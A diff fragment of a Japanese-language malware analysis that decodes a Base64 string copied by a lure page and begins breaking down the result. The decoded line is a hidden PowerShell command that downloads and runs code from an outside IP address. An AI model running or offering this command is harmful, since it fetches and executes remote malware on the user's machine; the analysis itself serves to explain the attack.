@@ -63,7 +63,8 @@ Base64は後回しにして、まずこのHTMLページが何を表示してい�
 画像下部にはクリック時にコマンドを自動でコピーするコードがあり、画像上部には変数copyCommandにBase64が代入されているのが確認できる。このBase64こそ、Burpの結果の一番上で見つけたものだ。<br>
 デコードしてみよう。<br>
 Base64：cG93ZXJzaGVsbCAtd2kgbWkgLUVQIEIgLWMgaWV4KGlybSAxOTMuMTExLjExNy4yMjYvVi5HUkUp<br>
-デコード結果：powershell -wi mi -EP B -c iex(irm 193.111.117.226/V.GRE)<br>
+デコード結果：powershell -wi mi -EP B -c iex(irm 193.111.117.226/V.GRE)
+
 分解してみると：<br>
 ・PowerShellを起動<br>
 ・-wi mi で最小化状態で実行（実質的に非表示）<br>
